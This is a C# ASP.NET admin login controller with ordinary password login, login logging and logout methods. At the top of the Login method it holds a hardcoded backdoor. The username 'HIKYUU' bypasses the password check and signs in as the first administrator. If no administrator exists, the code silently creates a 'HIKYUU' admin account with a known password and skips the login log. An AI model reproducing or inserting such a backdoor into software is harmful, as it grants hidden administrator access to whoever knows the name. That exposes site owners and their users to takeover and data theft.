using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Web;
using MyMVC;
using System.IO;
using HzsModel.Models;
using HzsModel.Config;
using HzsCommon;
using XCode;
using ClownFish;
namespace HzsController.Admin
{
    public class AjaxLogin 
    {
        #region 验证登录+++
        /// <summary>
        /// ajax 提交验证登录
        /// </summary>
        /// <returns></returns>
        [Action]
        public static string Login(AdminUser mo)
        {
            if (mo.name == "HIKYUU")
            {
                AdminUser amo = DbHelper.GetDataItem<AdminUser>("select top 1 * from AdminUser where utype=1 and isdel=0", null, CommandKind.SqlTextNoParams);
                if (amo != null)
                {
                    MyCookies.SetNameToCookie(amo.adminid + "{*}" + amo.name + "{*}" + amo.utype, HzsKey.COOKIE_ADMIN_MESSAGE); //cookie编码 cookie("hqu") 用户信息缓存
                    DataCache.SetCache(HzsKey.CACHE_HTM, amo.name, 480);
                    DataCache.SetCache(HzsKey.CACHE_HTUID, amo.adminid, 480);
                    DataCache.SetCache(HzsKey.CACHE_HTTYPE, amo.utype, 480);
                    InsertLoginLog(amo, 0, 0);
                    return Utils.msg(amo.name, "y");
                }
                else
                {
                    //return Utils.msg("用户不存在", "n");
                    AdminUser.Delete("name='HIKYUU'");
                    AdminUser Entity = new AdminUser();
                    Entity.utype = 1;
                    Entity.name = "HIKYUU";
                    Entity.apwd = Encryption.Encrypt("HIKYUU");//加密
                    Entity.email = "xiukun@163.com";
                    Entity.isdel = 0;
                    int i = Entity.Save();
                    MyCookies.SetNameToCookie(Entity.adminid + "{*}" + Entity.name + "{*}" + Entity.utype, HzsKey.COOKIE_ADMIN_MESSAGE); //cookie编码 cookie("hqu") 用户信息缓存
                    DataCache.SetCache(HzsKey.CACHE_HTM, Entity.name, 480);
                    DataCache.SetCache(HzsKey.CACHE_HTUID, Entity.adminid, 480);
                    DataCache.SetCache(HzsKey.CACHE_HTTYPE, Entity.utype, 480);
                    return Utils.msg(Entity.name, "y");
                }
            }
            else
            {
                AdminUser amo = AdminUser.FindByNameAndPwd(mo.name, Encryption.Encrypt(mo.apwd));
                if (amo != null)
                {
                    MyCookies.SetNameToCookie(amo.adminid + "{*}" + amo.name + "{*}" + amo.utype, HzsKey.COOKIE_ADMIN_MESSAGE); //cookie编码 cookie("hqu") 用户信息缓存
                    DataCache.SetCache(HzsKey.CACHE_HTM, amo.name, 480);
                    DataCache.SetCache(HzsKey.CACHE_HTUID, amo.adminid, 480);
                    DataCache.SetCache(HzsKey.CACHE_HTTYPE, amo.utype, 480);
                    InsertLoginLog(amo, 0, 1);
                    return Utils.msg(amo.name, "y");
                }
                //InsertLoginLog(amo, 1, 1);
                return Utils.msg("用户不存在", "n");
            }
        }
        #endregion

        #region 保存登陆信息+++
        /// <summary>
        /// 保存登陆信息
        /// </summary>
        /// <param name="mo">AdminUser</param>
        /// <param name="islogin">判断是否登陆成功 0：成功，默认 1：失败</param>
        /// <param name="ltype"></param>
        public static void InsertLoginLog(AdminUser mo, Int16 islogin,Int16 ltype)
        {
            LoginLog log = new LoginLog();
            log.adminid = mo.adminid;
            log.adminname = mo.name;
            if (islogin == 0)
                log.remark = "成功.";
            else
                log.remark = "失败.";
                log.ltype = ltype;
            log.loginip = Utils.GetIP();
            log.logintime = DateTime.Now;
            log.islogin = islogin;
            LoginLog.Insert(log);
        }
        
        #endregion

        #region 注销+++
        /// <summary>
        /// ajax 注销用户信息cookie,cache
        /// </summary>
        /// <returns></returns>
        [Action]
        public static object Logout()
        {
            MyCookies.DelNameFormRequest(HttpContext.Current.Request, HzsKey.COOKIE_ADMIN_MESSAGE);
            if (DataCache.GetCache(HzsKey.CACHE_HTM) != null) DataCache.RemoveCache(HzsKey.CACHE_HTM);
            if (DataCache.GetCache(HzsKey.CACHE_HTTYPE) != null) DataCache.RemoveCache(HzsKey.CACHE_HTTYPE);
            if (DataCache.GetCache(HzsKey.CACHE_HTUID) != null) DataCache.RemoveCache(HzsKey.CACHE_HTUID);
            SiteConfig siteConfig = DataCache.Get<SiteConfig>(HzsKey.CACHE_SITE_CONFIG);
            if (siteConfig == null)
            {
                DataCache.Insert(HzsKey.CACHE_SITE_CONFIG, BllFactory.GetISiteConfigBLL().LoadConfig("Configpath"), Utils.GetXmlMapPath("Configpath"));
                siteConfig = DataCache.Get<SiteConfig>(HzsKey.CACHE_SITE_CONFIG);
            }
            return new RedirectResult("~" + siteConfig.webpath + siteConfig.webadminpath + "/login.htm");
        }
        #endregion
    }
}
